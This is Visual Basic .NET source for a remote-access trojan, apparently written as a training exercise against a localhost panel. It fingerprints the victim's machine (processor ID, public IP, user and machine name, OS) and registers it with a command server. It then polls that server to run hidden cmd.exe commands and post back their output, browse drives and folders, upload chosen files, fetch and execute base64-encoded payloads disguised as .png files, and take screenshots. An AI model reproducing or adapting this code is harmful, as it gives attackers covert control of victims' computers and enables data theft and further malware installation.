Imports System.IO
Imports System.Management
Imports System.Net, System.Text, System.Drawing, System.Drawing.Drawing2D, System.Windows.Forms.Screen, System.Drawing.Graphics, System.Net.Sockets
Public Class Form1
    Private WithEvents navigator As New WebBrowser
    Private mininav As New WebClient
    Private HWID As String = ""
    Private oldcmd As String
    Private Function RandomString()
        Dim r As New Random
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        Dim sb As New StringBuilder
        Dim cnt As Integer = r.Next(15, 33)
        For i As Integer = 1 To cnt
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Private Function sendflm(ByVal info As String)
        Try
            Dim s As HttpWebRequest
            Dim enc As UTF8Encoding
            Dim dadospost As String
            Dim bytesdosdados As Byte()
            s = HttpWebRequest.Create("http://localhost/treinamento/bot.php")
            enc = New System.Text.UTF8Encoding()
            dadospost = "action=flm&hwid=" & HWID & "&flm=" & info
            bytesdosdados = enc.GetBytes(dadospost)
            s.Method = "POST"
            s.ContentType = "application/x-www-form-urlencoded"
            s.ContentLength = bytesdosdados.Length
            Using Stream = s.GetRequestStream()
                Stream.Write(bytesdosdados, 0, bytesdosdados.Length)
            End Using
            Dim resultado = s.GetResponse()
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
        Return "OK"
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim meuip As String
        meuip = New UTF8Encoding().GetString(mininav.DownloadData("http://api.ipify.org/?format=txt"))
        Dim arroz As New ManagementClass("win32_processor")
        Dim feijao As ManagementObjectCollection = arroz.GetInstances()
        For Each abacate As ManagementObject In feijao
            HWID = abacate.Properties("processorID").Value.ToString
        Next
        Dim infos As String = "hwid=" & HWID & "&Ip=" & meuip & "&User=" & Environment.UserName & "&Pc=" & Environment.MachineName & "&Os=" & My.Computer.Info.OSFullName & "&DataeHora=" & TimeOfDay & "-" & Date.Today.ToString
        navigator.Navigate("http://localhost/treinamento/bot.php?action=cad&" & infos)
        Timer1.Start()
    End Sub
    Private Function CapturarTela() As Bitmap
        Try
            Dim Tela As New Bitmap(PrimaryScreen.Bounds.Width, PrimaryScreen.Bounds.Height, Imaging.PixelFormat.Format32bppArgb)
            Dim GFX As Graphics = FromImage(Tela)
            GFX.CopyFromScreen(PrimaryScreen.Bounds.X, PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy)
            Return Tela
            Tela.Dispose()
            GFX.Dispose()
        Catch ex As Exception
        End Try
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim cmd As String
        cmd = New UTF8Encoding().GetString(mininav.DownloadData("http://localhost/treinamento/bot.php?action=cmd&hwid=" & HWID))
        If Not oldcmd = cmd Then
            oldcmd = cmd
            If Not cmd = "" Then
                Dim dados As String() = Split(cmd, "|")
                Select Case dados(0)
                    Case "msg"
                        MsgBox(dados(1))
                    Case "cmd"
                        'Shell(dados(1))

                        Dim Processinho As New Process()
                        Dim infodeinicio As New ProcessStartInfo
                        infodeinicio.FileName = "C:\Windows\System32\cmd.exe"
                        infodeinicio.Arguments = " /c " & dados(1)
                        infodeinicio.CreateNoWindow = True
                        infodeinicio.UseShellExecute = False
                        infodeinicio.RedirectStandardOutput = True
                        Processinho.StartInfo = infodeinicio
                        Processinho.Start()
                        Processinho.WaitForExit()
                        Dim output As StreamReader = Processinho.StandardOutput()
                        navigator.Navigate("http://localhost/treinamento/bot.php?action=out&out=" & output.ReadToEnd() & "&hwid=" & HWID)
                        output.Close()
                        Processinho.Close()
                    Case "flm"
                        If dados.Length = 1 Then
                            Dim root As String = ""
                            For Each x As DriveInfo In My.Computer.FileSystem.Drives
                                Select Case x.DriveType
                                    Case 3
                                        root += "[FIXO] " & x.Name & "[:]" & x.Name & "|"
                                    Case 5
                                        root += "[CD-DVD] " & x.Name & "[:]" & x.Name & "|"
                                End Select
                            Next
                            sendflm(root)
                        Else
                            Dim pastasearquivos As String = ""
                            Dim pegadados As New DirectoryInfo(dados(1))
                            For Each sob As DirectoryInfo In pegadados.GetDirectories
                                pastasearquivos += "[PASTA] " & sob.Name & "[:]" & sob.Name & "\|"
                            Next
                            For Each fil As FileInfo In pegadados.GetFiles("*.*")
                                pastasearquivos += fil.Name & "[:]" & fil.Name & "|"
                            Next
                            sendflm(pastasearquivos)
                        End If
                    Case "dwl"
                        Try
                            My.Computer.Network.UploadFile(dados(1), "http://localhost/treinamento/upload.php")
                        Catch : End Try
                    Case "b64"
                        Try
                            Dim src As String = New UTF8Encoding().GetString(mininav.DownloadData(dados(1)))
                            Dim malwarename As String = "/" & RandomString(10) & ".png"
                            IO.File.WriteAllBytes(IO.Path.GetTempPath & malwarename, Convert.FromBase64String(src))
                            Threading.Thread.Sleep(1000)
                            Process.Start(IO.Path.GetTempPath & malwarename)
                        Catch : End Try
                    Case "rdp"
                        PictureBox1.Image = CapturarTela()
                        Try
                            PictureBox1.Image.Save(Application.StartupPath & "/rdp.jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
                            My.Computer.Network.UploadFile(Application.StartupPath & "/rdp.jpg", "C:/xampp/htdocs/treinamento/Users/" & HWID & "/rdp.php")
                        Catch : End Try
                End Select
            End If
        End If
    End Sub
End Class
